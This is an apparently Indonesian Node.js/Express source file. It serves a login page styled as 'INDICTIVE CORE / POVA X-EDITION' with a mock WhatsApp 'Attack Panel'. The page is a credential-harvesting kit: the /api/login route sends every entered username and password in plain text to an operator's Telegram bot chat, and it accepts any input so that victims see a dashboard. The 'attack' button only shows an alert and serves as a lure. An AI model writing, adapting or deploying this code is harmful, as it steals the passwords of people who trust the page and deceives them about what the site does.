const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// --- KONFIGURASI TELEGRAM ---
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Ganti dengan Token Bot Anda
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Ganti dengan Chat ID Anda

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Melayani file statis (HTML, CSS, JS) jika ada di folder 'public'
app.use(express.static('public'));

// --- ROUTE UTAMA (HALAMAN HTML KOMPLIT) ---
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SISTEM AKSES - POVA X-EDITION</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css" />
    <style>
        :root {
            --bg-black: #050507;
            --accent-blue: #00d2ff;
            --accent-pink: #ff2d75;
            --text-white: #ffffff;
            --border: #1a1a1a;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
        body { background-color: var(--bg-black); color: var(--text-white); overflow-x: hidden; }

        /* HALAMAN LOGIN (INDICTIVE CORE) */
        #login-page {
            height: 100vh; display: flex; justify-content: center; align-items: center;
            background-image: radial-gradient(circle at center, #1a1a2e 0%, #05050a 100%);
        }
        .login-card {
            width: 90%; max-width: 380px; background: rgba(25, 25, 35, 0.85);
            backdrop-filter: blur(15px); border-radius: 30px; padding: 40px 20px;
            border: 1px solid rgba(255, 255, 255, 0.05); text-align: center;
        }
        .login-profile-glow {
            width: 90px; height: 90px; margin: 0 auto 20px; border-radius: 50%;
            border: 3px solid var(--accent-pink); padding: 2px; box-shadow: 0 0 20px rgba(255, 45, 117, 0.4);
        }
        .login-profile-glow img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        .middle-banner-skew {
            width: 100%; height: 80px; border-radius: 15px; overflow: hidden;
            margin-bottom: 30px; border: 1px solid rgba(255, 45, 117, 0.3); transform: skewX(-5deg);
        }
        .middle-banner-skew img { width: 100%; height: 100%; object-fit: cover; transform: skewX(5deg); }
        .input-box {
            background: rgba(40, 40, 55, 0.5); border-radius: 15px; padding: 12px 15px;
            display: flex; align-items: center; gap: 10px; margin-bottom: 15px; border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .input-box input { background: transparent; border: none; color: white; width: 100%; outline: none; }
        .btn-login {
            width: 100%; background: linear-gradient(90deg, var(--accent-pink), #a366ff);
            color: white; border: none; padding: 15px; border-radius: 15px; font-weight: bold; cursor: pointer;
        }

        /* HALAMAN DASHBOARD (POVA X-EDITION) */
        #dashboard-page { display: none; }
        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid var(--border); }
        .container { padding: 15px; padding-bottom: 120px; }
        .swiper-container { width: 100%; border-radius: 15px; overflow: hidden; margin-bottom: 20px; height: 180px; border: 1px solid #222; }
        .swiper-slide video { width: 100%; height: 100%; object-fit: cover; }
        .info-title-bar {
            background: linear-gradient(90deg, #0056ff, transparent); padding: 12px 15px;
            border-radius: 12px 12px 0 0; font-size: 13px; font-weight: bold; display: flex; align-items: center; gap: 10px;
        }
        .info-card {
            background: #0d0d0d; border: 1px solid var(--border); border-radius: 0 0 15px 15px;
            padding: 5px 20px; margin-bottom: 20px;
        }
        .info-row { display: flex; align-items: center; gap: 15px; padding: 15px 0; border-bottom: 1px solid #1a1a1a; }
        .icon-circle {
            width: 40px; height: 40px; background: #0a1118; border-radius: 10px;
            display: flex; align-items: center; justify-content: center; color: var(--accent-blue);
        }

        /* WHATSAPP PANEL */
        #whatsapp-sec { display: none; }
        .wa-card { background: #11121a; border-radius: 20px; padding: 25px; border: 1px solid var(--border); margin-bottom: 20px; border-top: 2px solid var(--accent-pink); text-align: center; }
        .wa-input-wrap { background: #0d0e14; border: 1px solid #1a1a1a; border-radius: 15px; padding: 18px; margin-bottom: 20px; }
        .wa-btn { width: 100%; background: linear-gradient(90deg, #ff003c, #990024); color: white; border: none; padding: 20px; border-radius: 18px; font-weight: bold; cursor: pointer; }

        .nav-dock {
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
            width: 75%; background: #1c1d26; border-radius: 40px; padding: 10px 5px;
            display: flex; justify-content: space-around; border: 1px solid #333; z-index: 999;
        }
        .nav-item { color: #555; text-decoration: none; text-align: center; flex: 1; font-size: 9px; cursor: pointer; }
        .nav-item.active { color: #b088ff; }
    </style>
</head>
<body>

    <div id="login-page">
        <div class="login-card">
            <div class="login-profile-glow">
                <img src="https://i.pinimg.com/736x/8e/eb/1b/8eeb1b268019e0b1d31a52c009b02a9b.jpg">
            </div>
            <h2>INDICTIVE CORE</h2>
            <p style="font-size: 10px; color: #00d2ff; margin-bottom: 25px;">SYSTEM ACCESS GATEWAY</p>
            <div class="middle-banner-skew">
                <img src="https://i.pinimg.com/originals/8e/eb/1b/8eeb1b268019e0b1d31a52c009b02a9b.gif">
            </div>
            <div class="input-box">
                <i class="fas fa-user" style="color: var(--accent-pink);"></i>
                <input type="text" id="user" placeholder="Username">
            </div>
            <div class="input-box">
                <i class="fas fa-lock" style="color: var(--accent-pink);"></i>
                <input type="password" id="pass" placeholder="Password">
            </div>
            <button class="btn-login" onclick="sendToTelegram()">LOGIN SYSTEM</button>
        </div>
    </div>

    <div id="dashboard-page">
        <header><i class="fas fa-bars"></i><div class="header-title">POVA X-EDITION</div><i class="fas fa-user-circle"></i></header>
        <div class="container">
            <section id="home-sec" class="page-content">
                <div class="swiper-container"><div class="swiper-wrapper"><div class="swiper-slide"><video autoplay muted loop src="https://assets.mixkit.co/videos/preview/mixkit-circuit-board-animation-1551-large.mp4"></video></div></div></div>
                <div class="info-title-bar"><i class="fas fa-user-circle"></i> ACCOUNT INFO</div>
                <div class="info-card">
                    <div class="info-row"><div class="icon-circle"><i class="fas fa-user"></i></div><div><p style="font-size:10px; color:#888;">USERNAME</p><b id="display-user">KieraaAcuu</b></div></div>
                    <div class="info-row"><div class="icon-circle"><i class="fas fa-shield-alt"></i></div><div><p style="font-size:10px; color:#888;">ROLE</p><b style="color:var(--accent-blue)">Owner</b></div></div>
                </div>
            </section>
            <section id="whatsapp-sec" class="page-content">
                <h2 style="margin-bottom:20px;">Attack Panel</h2>
                <div class="wa-card"><div class="login-profile-glow" style="margin-bottom:15px; width:60px; height:60px;"><img src="https://i.ibb.co/vz6T8H8/profile.jpg"></div><div style="font-weight:bold;">\${username}</div></div>
                <div class="wa-input-wrap"><p style="margin-bottom:10px; font-weight:bold;">Nomor Target</p><input type="text" id="target" placeholder="+62xxx" style="background:transparent; border:none; color:white; width:100%; outline:none;"></div>
                <button class="wa-btn" onclick="alert('Attack Sent!')">SEND ATTACK</button>
            </section>
        </div>
        <nav class="nav-dock">
            <div class="nav-item active" onclick="switchTab('home-sec', this)"><i class="fas fa-home"></i>Home</div>
            <div class="nav-item" onclick="switchTab('whatsapp-sec', this)"><i class="fab fa-whatsapp"></i>WhatsApp</div>
        </nav>
    </div>

    <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
    <script>
        async function sendToTelegram() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            if(!user || !pass) return alert("Isi data!");

            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user, pass })
            });

            if(response.ok) {
                document.getElementById('display-user').innerText = user;
                document.getElementById('login-page').style.display = 'none';
                document.getElementById('dashboard-page').style.display = 'block';
                new Swiper('.swiper-container', { loop: true, autoplay: { delay: 4000 } });
            }
        }

        function switchTab(id, el) {
            document.querySelectorAll('.page-content').forEach(s => s.style.display = 'none');
            document.getElementById(id).style.display = 'block';
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        }
    </script>
</body>
</html>
    `);
});

// --- API UNTUK MENGIRIM DATA KE TELEGRAM ---
app.post('/api/login', async (req, res) => {
    const { user, pass } = req.body;

    const message = \`
🚀 *NEW LOGIN DETECTED* 🚀
━━━━━━━━━━━━━━━━━━━━
👤 *Username:* \${user}
🔑 *Password:* \${pass}
━━━━━━━━━━━━━━━━━━━━
🌐 *Sistem:* POVA X-EDITION
\`;

    try {
        await fetch(\`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(\`Server berjalan di http://localhost:\${PORT}\`);
});